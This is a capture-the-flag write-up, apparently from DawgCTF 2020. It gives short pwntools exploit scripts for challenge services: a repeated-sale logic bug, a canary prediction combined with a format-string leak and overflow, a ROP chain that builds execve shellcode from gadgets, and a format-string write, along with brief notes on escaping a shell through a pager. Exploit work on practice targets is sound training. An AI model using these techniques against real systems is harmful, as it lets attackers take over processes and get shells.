## Animal Crossing

The problem is that we can sell stuff multi times.

```python
from pwn import *
context.arch = 'amd64'

r = remote("ctf.umbccd.io",4400)

def buy(idx):
    r.sendlineafter("Choice: ", '2')
    r.sendlineafter("420000 bells\n", str(idx))

def sell(idx):
    r.sendlineafter("Choice: ", '1')
    r.recv()
    r.sendline(str(idx))

buy(2)

cnt = 0
p = log.progress('Selling...')

for i in range(53):
    sell(5)
    cnt += 1
    p.status("Sell %d items", cnt)

p.success("done (%d items)", cnt)

sell(1)
buy(6)

r.interactive()
```

## Cookie Monster

Yeah we just managed to guess the random number because I'm so lazy..

```python
from pwn import *
from ctypes import *
context.arch = 'amd64'

p = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
r = remote("ctf.umbccd.io", 4200)

canary = p.rand()

sh = "%11$p"
r.sendlineafter("name?\n", sh)
r.recvuntil("Hello, ")
a = r.recvline().strip()
a = int(a, 16) - 0x134f

sh = 'a'*(0x11-0x4) + p32(canary) + p64(0) + p64(a + 0x11B5)
r.sendlineafter("cookie?\n", sh)
r.interactive()
```

## Rop

Just compare `shcraft.sh()` with the seven gadgets and we can concat them into a valid shellcode chain.

My ugly draft:

```
\xC0\x40\xCD\x80
> .byte 0xc0
> inc eax
> int 0x80

\xC1\x89\xC2\xB0
> 0xC1
> mov    edx, eax
> 0xB0

\x31\xC0\x50\x68
> xor eax, eax
> push eax
> .byte 0x68

\x68\x2F\x62\x69
> "h/bi"

\x0B\xCD\x80\x31
> 0xB   "execve"
> int 0x80
> 0x31

\x2F\x2F\x73\x68
> "//sh"

\x6E\x89\xE3\x89          + x1 / x2
> 0x6e
> mov    ebx, esp
> 0x89

x2 + x5
\xC1\x89\xC2 - \xB0\x0B\xCD\x80\x31
> mov al, 0xb; int 0x80   [SYSCALL:EXECVE]

x3 + x6 + x4 + x7 + x2 + x5
```

exp:

```python
from pwn import *
context.arch = 'i386'

r = remote("ctf.umbccd.io", 4100)

x1 = 0x08049248
x2 = 0x080492E2
x3 = 0x0804937C
x4 = 0x08049416
x5 = 0x080494B0
x6 = 0x0804954A
x7 = 0x080495E4
call = 0x0804967E
main = 0x08049714
tryme = 0x80496ca

sh = 'a'*0x10 + p32(x3) + p32(tryme)
r.recv()
r.send(sh)
sh = 'a'*0x10 + p32(x6) + p32(tryme)
r.send(sh)
sh = 'a'*0x10 + p32(x4) + p32(tryme)
r.send(sh)
sh = 'a'*0x10 + p32(x7) + p32(tryme)
r.send(sh)
sh = 'a'*0x10 + p32(x2) + p32(tryme)
r.send(sh)
sh = 'a'*0x10 + p32(x5) + p32(tryme)
r.send(sh)
sh = 'a'*0x10 + p32(call)
r.sendline(sh)
r.interactive()
```

## Coronacation

Baby format string.

```python
from pwn import *
context.arch = 'amd64'

r = remote("ctf.umbccd.io", 4300)

sh = "1..%9$p..%14$p"
r.sendlineafter("out.\n", sh)
r.recvuntil("..")
a = int(r.recvuntil("..")[:-2], 16) - 0x14d5
b = int(r.recvline().strip(), 16)
win = a + 0x1165
retaddr = b - 0x58

x1 = win & 0xff
x2 = (win >> 8) & 0xff
sh = "%{}c%10$hhn".format(x1)
sh += "%{}c%11$hhn".format(x2 - x1)
sh = sh.ljust(0x20, "a")
sh += p64(retaddr)
sh += p64(retaddr + 1)

r.sendlineafter("plan.\n", sh)
r.interactive()
```

## Nash2 (not solve)

Learned sth new.

When the output is large, we can use `more` to get into pagination, and in this panel we can easily get shell.

[Reference](https://github.com/m3ssap0/CTF-Writeups/blob/master/DawgCTF%202020/Nash2/README.md)

## trASCII (not solve)

[Alphanumeric:numeric] typed shellcode. Too lazy to solve this chal :P
